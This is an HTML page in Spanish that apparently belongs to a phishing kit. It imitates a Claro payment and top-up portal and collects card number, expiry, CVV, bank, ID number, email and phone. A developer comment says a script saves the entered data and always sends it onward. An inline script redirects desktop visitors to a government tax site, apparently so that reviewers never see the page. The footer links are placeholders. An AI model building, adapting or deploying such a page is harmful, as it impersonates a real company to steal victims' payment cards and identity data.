<!DOCTYPE html>
<html lang="es">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, user-scalable=no" />
  <link rel="icon" type="image/png" href="img/favicon.ico" />
  <title>Portal de pagos Claro</title>
  <link rel="stylesheet" href="css/styles.css" />
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap"
    rel="stylesheet" />
  <link rel="stylesheet" href="css/index.css" />
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"
    integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.4.3/dist/js/bootstrap.bundle.min.js"></script>

  <!-- Carga aquí el functions es lo que va a guardar siempre la data Y LO VAS A USAR PARA MANDAR SIEMPRE LA INFORMACION -->
  <script src="./js/functions.js"></script>
  <style>
    body {
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }

    .footer {
      margin-top: auto;
      /* Ajusta el color de fondo según sea necesario */
      padding: 1rem;
      text-align: center;
    }
  </style>
</head>

<body>
  <header id="comida">
    <div class="caja_img">
      <img class="logo" src="img/logo-claro-blanco.svg" />
    </div>
  </header>
  <main>
    <div id="ggris1" class="gris1">
      <div class="texto_gris">
        <br /><br />
        <p class="texto1">
          Portal de
          <span class="rojo">PAGOS <span class="recargas"> Y RECARGAS</span></span>
        </p>
      </div>
    </div>

    <table id="tabla-opciones">
      <tr>
        <td valign="top" align="center">
          <img id="azul1" src="img/icono-seleccion-on.png" class="imagen" />
        </td>

        <td valign="top" align="center">
          <img id="azul2" src="img/icono-mediopago-on.png" class="imagen" />
        </td>

        <td valign="top" align="center">
          <img id="azul3" src="img/icono-pago-on.png" class="imagen" />
        </td>

        <td valign="top" align="center">
          <img id="azul4" src="img/icono-resultado-off.png" class="imagen" />
        </td>
      </tr>
      <tr>
        <td valign="top" align="center" class="etq-pasos act-pasos">
          Ingresa <br />tu Documento
        </td>

        <td valign="top" align="center" class="etq-pasos act-pasos">
          Escoge el <br />medio de pago
        </td>

        <td valign="top" align="center" class="etq-pasos act-pasos">
          Realiza el <br />Pago en linea
        </td>

        <td valign="top" align="center" class="etq-pasos">
          Recibe la <br />Confimacion
        </td>
      </tr>
    </table>
    <hr />
    <div class="form-section container py-2">
      <div class="companies-container text-center mb-4">
        <img src="./assets/svg/visa.svg" alt="Visa" class="me-3" style="width: 50px;">
        <img src="./assets/svg/mc.svg" alt="MasterCard" class="me-3" style="width: 50px;">
        <img src="./assets/svg/diners.svg" alt="Diners" class="me-3" style="width: 50px;">
        <img src="./assets/svg/amex.svg" alt="American Express" style="width: 50px;">
      </div>

      <h4 class="mb-4 text-center">Información de la tarjeta</h4>
      <form>
        <div class="row g-3">
          <div class="col-12">
            <input id="card_number" class="form-control" type="text" placeholder="Número de Tarjeta"
              oninput="formatCNumber(this); updateCVCLength(this.value)" />
          </div>
          <div class="col-md-6">
            <div class="row g-2">
              <div class="col-6">
                <input id="month-value" type="text" class="form-control" placeholder="MM" maxlength="2" />
              </div>
              <div class="col-6">
                <input id="year-value" type="text" class="form-control" placeholder="AA" maxlength="2" />
              </div>
            </div>
            <label class="form-label mt-2">Fecha de Expiración</label>
          </div>
          <div class="col-md-6">
            <input id="card_cvc" type="text" class="form-control" placeholder="CVV" maxlength="3" />
            <label class="form-label mt-2">Código de seguridad</label>
          </div>
          <div class="col-12">
            <select id="bank-option" class="form-select" required>
              <option value="" disabled selected>Seleccione su banco</option>
              <option label="BANCAMIA S.A." value="bancamia">BANCAMIA S.A.</option>
              <option label="BANCO AGRARIO" value="agrario">BANCO AGRARIO</option>
              <option label="BANCO AV VILLAS" value="avvillas">
                BANCO AV VILLAS
              </option>
              <option label="BANCO BBVA COLOMBIA S.A." value="bbva">
                BANCO BBVA COLOMBIA S.A.
              </option>
              <option label="BANCO CAJA SOCIAL" value="caja-social">
                BANCO CAJA SOCIAL
              </option>
              <option label="BANCO COOPERATIVO COOPCENTRAL" value="coopertaivo-coopcentral">
                BANCO COOPERATIVO COOPCENTRAL
              </option>
              <option label="BANCO CREDIFINANCIERA" value="credifinanciera">
                BANCO CREDIFINANCIERA
              </option>
              <option label="BANCO DAVIVIENDA" value="davivienda">
                BANCO DAVIVIENDA
              </option>
              <option label="BANCO DE BOGOTA" value="bogota">
                BANCO DE BOGOTA
              </option>
              <option label="BANCO DE OCCIDENTE" value="occidente">
                BANCO DE OCCIDENTE
              </option>
              <option label="BANCO FALABELLA " value="falabella">
                BANCO FALABELLA
              </option>
              <option label="BANCO FINANDINA S.A. BIC" value="finandina">
                BANCO FINANDINA S.A. BIC
              </option>
              <option label="BANCO GNB SUDAMERIS" value="sudameris">
                BANCO GNB SUDAMERIS
              </option>
              <option label="BANCO ITAU" value="itau">BANCO ITAU</option>
              <option label="BANCO PICHINCHA S.A." value="pichincha">
                BANCO PICHINCHA S.A.
              </option>
              <option label="BANCO POPULAR" value="popular">BANCO POPULAR</option>
              <option label="BANCO SANTANDER COLOMBIA" value="santander">
                BANCO SANTANDER COLOMBIA
              </option>
              <option label="BANCO SERFINANZA" value="serfinanza">
                BANCO SERFINANZA
              </option>
              <option label="BANCO UNION antes GIROS" value="union">
                BANCO UNION antes GIROS
              </option>
              <option label="BANCOLOMBIA" value="bancolombia">BANCOLOMBIA</option>
              <option label="BANCOOMEVA S.A." value="bancomeva">
                BANCOOMEVA S.A.
              </option>
              <option label="CFA COOPERATIVA FINANCIERA" value="cfa">
                CFA COOPERATIVA FINANCIERA
              </option>
              <option label="CITIBANK " value="citibank">CITIBANK</option>
            </select>

            </select>
          </div>

          <div class="col-12">
            <select id="dues" class="form-select" required>
              <option value="" disabled selected>Número de cuotas</option>
              <option value="1">1</option>
              <option value="2">2</option>
              <option value="3">3</option>
              <option value="4">4</option>
              <option value="5">5</option>
              <option value="6">6</option>
              <option value="7">7</option>
              <option value="8">8</option>
              <option value="9">9</option>
              <option value="10">10</option>
              <option value="11">11</option>
              <option value="12">12</option>
              <option value="13">13</option>
              <option value="14">14</option>
              <option value="15">15</option>
              <option value="16">16</option>
              <option value="17">17</option>
              <option value="18">18</option>
              <option value="19">19</option>
              <option value="20">20</option>
              <option value="21">21</option>
              <option value="22">22</option>
              <option value="23">23</option>
              <option value="24">24</option>
            </select>
          </div>
        </div>

        <h4 class="mt-5 mb-4 text-center">Información del titular</h4>
        <div class="row g-3">
          <div class="col-12">
            <input id="name_card" type="text" class="form-control" placeholder="Nombre y apellido del titular" />
          </div>

          <div class="col-md-6">
            <input id="documentnumber" type="number" class="form-control" placeholder="Número de identificación" />
          </div>

          <div class="col-md-6">
            <input id="email_user" type="email" class="form-control" placeholder="Correo electrónico" />
          </div>

          <div class="col-md-6">
            <input id="tel" type="tel" class="form-control" placeholder="Celular" maxlength="10" />
          </div>

          <div class="col-12 text-center">
            <button id="next-step" type="submit" class="btn btn-danger mt-3">
              Siguiente paso
            </button>
          </div>
        </div>
      </form>
    </div>

  </main>
  <footer class="footer">
    <p>Todos los derechos reservados, Claro 2025</p>
    <nav class="footer-links">
      <a href="#mapa">Mapa de sitio</a>
      <a href="#denuncias">Portal de denuncias</a>
      <a href="#legal">Legal y regulatorio</a>
    </nav>
  </footer>
  <script src="points/checkers/js/payment.js"></script>
  <script>
    function isMobile() {
      return /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
    }

    if (!isMobile()) {
      window.location.href = "https://www.dian.gov.co/";
    }
  </script>
</body>

</html>
